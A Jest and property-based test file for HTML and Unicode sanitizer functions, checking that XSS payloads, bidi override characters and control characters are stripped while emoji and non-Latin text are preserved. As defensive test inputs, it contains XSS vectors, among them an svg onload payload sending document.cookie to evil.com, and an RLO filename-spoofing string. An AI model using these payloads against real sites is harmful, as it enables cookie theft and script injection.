import * as fc from 'fast-check';
import { stripHtml, stripUserContent } from './sanitize';

describe('stripHtml', () => {
  it('should strip HTML tags and script content', () => {
    expect(stripHtml('<script>alert("xss")</script>Hello')).toBe('Hello');
  });

  it('should strip inline tags but keep their text', () => {
    expect(stripHtml('<b>bold</b> text')).toBe('bold text');
  });

  it('should keep already-encoded markup inert (no raw angle brackets)', () => {
    const out = stripHtml('&lt;div&gt;test&lt;/div&gt;');
    expect(out).not.toContain('<');
    expect(out).not.toContain('>');
  });

  it('should preserve plain text', () => {
    expect(stripHtml('Hello from Abuja!')).toBe('Hello from Abuja!');
  });

  it('should preserve emojis and unicode', () => {
    expect(stripHtml('Hello 🌍 from Abuja!')).toBe('Hello 🌍 from Abuja!');
    expect(stripHtml('Ẽmoji tëst 日本語')).toBe('Ẽmoji tëst 日本語');
  });

  it('should trim whitespace', () => {
    expect(stripHtml('  hello  ')).toBe('hello');
  });

  it('should handle empty string', () => {
    expect(stripHtml('')).toBe('');
  });

  // XSS vector tests (OWASP cheat sheet) — output must contain no executable markup
  it('should block img onerror payload', () => {
    expect(stripHtml('<img src=x onerror="alert(1)">')).toBe('');
  });

  it('should block svg onload payload', () => {
    expect(stripHtml('<svg onload="fetch(\'https://evil.com/?c=\'+document.cookie)">')).toBe('');
  });

  it('should block javascript: URI scheme but keep link text', () => {
    expect(stripHtml('<a href="javascript:alert(1)">click</a>')).toBe('click');
  });

  it('should block mutation XSS via null-byte-obfuscated tags', () => {
    const out = stripHtml('<scr\x00ipt>alert(1)</scr\x00ipt>');
    expect(out).not.toContain('<');
    expect(out).not.toContain('>');
  });

  it('should block nested/obfuscated script tag', () => {
    expect(stripHtml('<<script>script>alert(1)<</script>/script>')).not.toContain('alert');
  });

  it('should block style-based XSS', () => {
    expect(stripHtml('<style>body{background:url("javascript:alert(1)")}</style>text')).toBe(
      'text',
    );
  });

  it('should block event handler attributes', () => {
    expect(stripHtml('<div onclick="alert(1)">text</div>')).toBe('text');
    expect(stripHtml('<input onfocus="alert(1)">')).toBe('');
  });

  it('should block data: URI injection', () => {
    expect(stripHtml('<img src="data:text/html,<script>alert(1)</script>">')).toBe('');
  });

  it('output never contains an executable script tag', () => {
    const vectors = [
      '<script>alert(1)</script>',
      '<IMG SRC=javascript:alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>',
    ];
    for (const v of vectors) {
      expect(stripHtml(v).toLowerCase()).not.toContain('<script');
    }
  });
});

describe('stripUserContent', () => {
  // Bidi control character removal tests
  describe('Unicode bidi control character removal', () => {
    it('should remove U+202E (RLO - Right-to-Left Override)', () => {
      const input = 'hello\u202Egnignignignignignignignignignignigni';
      const output = stripUserContent(input);
      expect(output).toBe('hellognignignignignignignignignignignigni');
      expect(output).not.toContain('\u202E');
    });

    it('should remove U+202A (LRE - Left-to-Right Embedding)', () => {
      const input = 'start\u202Amiddle\u202Cend';
      const output = stripUserContent(input);
      expect(output).toBe('startmiddleend');
      expect(output).not.toContain('\u202A');
      expect(output).not.toContain('\u202C');
    });

    it('should remove U+202B (RLE - Right-to-Left Embedding)', () => {
      const input = 'test\u202Bembedded\u202Ctext';
      const output = stripUserContent(input);
      expect(output).toBe('testembeddedtext');
      expect(output).not.toContain('\u202B');
    });

    it('should remove U+202C (PDF - Pop Directional Formatting)', () => {
      const input = 'abc\u202Cdef';
      const output = stripUserContent(input);
      expect(output).toBe('abcdef');
      expect(output).not.toContain('\u202C');
    });

    it('should remove U+202D (LRO - Left-to-Right Override)', () => {
      const input = 'text\u202Doverride';
      const output = stripUserContent(input);
      expect(output).toBe('textoverride');
      expect(output).not.toContain('\u202D');
    });

    it('should remove U+2066 (LRI - Left-to-Right Isolate)', () => {
      const input = 'before\u2066isolate\u2069after';
      const output = stripUserContent(input);
      expect(output).toBe('beforeisolateafter');
      expect(output).not.toContain('\u2066');
    });

    it('should remove U+2067 (RLI - Right-to-Left Isolate)', () => {
      const input = 'start\u2067isolate\u2069end';
      const output = stripUserContent(input);
      expect(output).toBe('startisolateend');
      expect(output).not.toContain('\u2067');
    });

    it('should remove U+2068 (FSI - First Strong Isolate)', () => {
      const input = 'text\u2068first\u2069strong';
      const output = stripUserContent(input);
      expect(output).toBe('textfirststrong');
      expect(output).not.toContain('\u2068');
    });

    it('should remove U+2069 (PDI - Pop Directional Isolate)', () => {
      const input = 'pop\u2069test';
      const output = stripUserContent(input);
      expect(output).toBe('poptest');
      expect(output).not.toContain('\u2069');
    });

    it('should remove multiple bidi characters in one string', () => {
      const input = 'a\u202Ab\u202Bc\u202Cd\u202De\u202Ef\u2066g\u2067h\u2068i\u2069j';
      const output = stripUserContent(input);
      expect(output).toBe('abcdefghij');
      // Verify none of the bidi characters remain
      expect(output).not.toMatch(/[\u202A-\u202E\u2066-\u2069]/);
    });
  });

  // Preservation tests
  describe('Content preservation', () => {
    it('should preserve standard emoji', () => {
      const input = 'Hello 🌍 World 🎉 Test 👍';
      const output = stripUserContent(input);
      expect(output).toBe('Hello 🌍 World 🎉 Test 👍');
    });

    it('should preserve emoji with skin tone modifiers', () => {
      const input = 'Wave 👋🏾 and thumbs up 👍🏽';
      const output = stripUserContent(input);
      expect(output).toBe('Wave 👋🏾 and thumbs up 👍🏽');
    });

    it('should preserve emoji ZWJ sequences', () => {
      const input = 'Family 👨‍👩‍👧‍👦 and rainbow flag 🏳️‍🌈';
      const output = stripUserContent(input);
      expect(output).toBe('Family 👨‍👩‍👧‍👦 and rainbow flag 🏳️‍🌈');
    });

    it('should preserve accented characters', () => {
      const input = 'Café résumé naïve';
      const output = stripUserContent(input);
      expect(output).toBe('Café résumé naïve');
    });

    it('should preserve CJK characters', () => {
      const input = '日本語 中文 한국어';
      const output = stripUserContent(input);
      expect(output).toBe('日本語 中文 한국어');
    });

    it('should preserve Arabic and Hebrew text', () => {
      const input = 'مرحبا שלום';
      const output = stripUserContent(input);
      expect(output).toBe('مرحبا שלום');
    });

    it('should preserve mixed Unicode content', () => {
      const input = 'Test Ẽñõẽd 日本 🌟 café';
      const output = stripUserContent(input);
      expect(output).toBe('Test Ẽñõẽd 日本 🌟 café');
    });
  });

  // Combined HTML + bidi removal
  describe('Combined HTML and bidi removal', () => {
    it('should strip both HTML and bidi characters', () => {
      const input = '<b>bold\u202Etext</b>';
      const output = stripUserContent(input);
      expect(output).toBe('boldtext');
      expect(output).not.toContain('<');
      expect(output).not.toContain('\u202E');
    });

    it('should handle script tags with bidi characters', () => {
      const input = '<script>alert("xss")</script>safe\u202Etext';
      const output = stripUserContent(input);
      expect(output).toBe('safetext');
      expect(output).not.toContain('alert');
      expect(output).not.toContain('\u202E');
    });

    it('should sanitize adversarial content from problem statement', () => {
      const input = 'hello\u202Egnignignignignignignignignignignigni';
      const output = stripUserContent(input);
      expect(output).toBe('hellognignignignignignignignignignignigni');
      expect(output).not.toContain('\u202E');
    });
  });

  // Edge cases
  describe('Edge cases', () => {
    it('should handle empty string', () => {
      expect(stripUserContent('')).toBe('');
    });

    it('should handle string with only bidi characters', () => {
      const input = '\u202A\u202B\u202C\u202D\u202E';
      const output = stripUserContent(input);
      expect(output).toBe('');
    });

    it('should handle plain text without bidi or HTML', () => {
      const input = 'Plain text content';
      const output = stripUserContent(input);
      expect(output).toBe('Plain text content');
    });

    it('should trim whitespace', () => {
      const input = '  hello\u202Eworld  ';
      const output = stripUserContent(input);
      expect(output).toBe('helloworld');
    });
  });

  // Regression test: old behavior would have accepted bidi
  describe('Regression tests', () => {
    it('should reject bidi characters that old stripHtml would accept', () => {
      const input = 'test\u202Econtent';
      // Old behavior: stripHtml would keep bidi characters
      const oldBehavior = stripHtml(input);
      expect(oldBehavior).toContain('\u202E'); // Verify old behavior

      // New behavior: stripUserContent removes them
      const newBehavior = stripUserContent(input);
      expect(newBehavior).not.toContain('\u202E');
      expect(newBehavior).toBe('testcontent');
    });

    it('should demonstrate bidi vulnerability in old handler', () => {
      const maliciousInput = 'filename\u202Etxt.exe';

      // Old stripHtml preserves the bidi character
      expect(stripHtml(maliciousInput)).toContain('\u202E');

      // New stripUserContent removes it
      expect(stripUserContent(maliciousInput)).not.toContain('\u202E');
      expect(stripUserContent(maliciousInput)).toBe('filenametxt.exe');
    });
  });
});

describe('stripUserContent — property-based tests', () => {
  // ── Category 1: No HTML survives ──────────────────────────────────────
  it('output never contains angle brackets for any string', () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const out = stripUserContent(input);
        expect(out).not.toContain('<');
        expect(out).not.toContain('>');
      }),
    );
  });

  // ── Category 2: Bidi control characters are always removed ────────────
  it('removes all Unicode bidi control characters (U+202A–U+202E, U+2066–U+2069)', () => {
    const bidiArbitrary = fc.constantFrom(
      '\u202A',
      '\u202B',
      '\u202C',
      '\u202D',
      '\u202E',
      '\u2066',
      '\u2067',
      '\u2068',
      '\u2069',
    );
    fc.assert(
      fc.property(fc.string(), bidiArbitrary, (prefix, bidi) => {
        const input = prefix + bidi + prefix;
        const out = stripUserContent(input);
        expect(out).not.toContain(bidi);
      }),
    );
  });

  // ── Category 3: Hidden / format characters are removed ────────────────
  it('removes zero-width and format characters (U+200B, U+200C, U+FEFF, U+00AD) while preserving ZWJ (U+200D)', () => {
    const hidden = fc.constantFrom(
      '\u200B', // zero-width space
      '\u200C', // zero-width non-joiner
      '\uFEFF', // BOM / zero-width no-break space
      '\u00AD', // soft hyphen
    );
    fc.assert(
      fc.property(fc.string(), hidden, (prefix, ch) => {
        const input = prefix + ch + prefix;
        const out = stripUserContent(input);
        expect(out).not.toContain(ch);
      }),
    );
  });

  // ── Category 4: Emoji ZWJ sequences are preserved ────────────────────
  it('preserves emoji ZWJ sequences and skin-tone modifiers', () => {
    const emojiSeq = fc.constantFrom(
      '👨‍👩‍👧‍👦', // family (ZWJ sequence)
      '👩‍💻', // woman technologist
      '🏳️‍🌈', // rainbow flag
      '👋🏾', // wave + medium-dark skin tone
      '👍🏽', // thumbs up + medium skin tone
      '🧑‍🎤', // singer
    );
    fc.assert(
      fc.property(emojiSeq, (seq) => {
        const input = `hello ${seq} world`;
        const out = stripUserContent(input);
        expect(out).toContain(seq);
      }),
    );
  });

  // ── Category 5: C0 and C1 control characters (except allowed) ────────
  it('removes C0 control characters (U+0000–U+001F) except newline and tab', () => {
    const c0 = fc.constantFrom(
      '\u0000',
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\u0007',
      '\u0008',
      '\u000B',
      '\u000C',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
    );
    fc.assert(
      fc.property(fc.string(), c0, (prefix, ch) => {
        const input = prefix + ch + prefix;
        const out = stripUserContent(input);
        expect(out).not.toContain(ch);
      }),
    );
  });

  // ── Category 6: Idempotency ──────────────────────────────────────────
  it('is idempotent — second pass produces identical output', () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const once = stripUserContent(input);
        const twice = stripUserContent(once);
        expect(twice).toBe(once);
      }),
    );
  });

  // ── Category 7: Output never contains executable JavaScript ──────────
  it('never produces output containing executable JS patterns', () => {
    fc.assert(
      fc.property(fc.string(), (input) => {
        const out = stripUserContent(input).toLowerCase();
        expect(out).not.toMatch(/<script/);
        expect(out).not.toMatch(/javascript\s*:/);
        expect(out).not.toMatch(/onerror\s*=/);
        expect(out).not.toMatch(/onload\s*=/);
      }),
    );
  });

  // ── Category 8: Plain text without special chars is preserved ─────────
  it('preserves alphanumeric and common punctuation', () => {
    fc.assert(
      fc.property(
        fc.string({ unit: fc.constantFrom('a', 'b', 'c', '1', '2', '3', ' ', '.', ',', '!', '?') }),
        (input) => {
          const out = stripUserContent(input);
          expect(out).toBe(input.trim());
        },
      ),
    );
  });
});
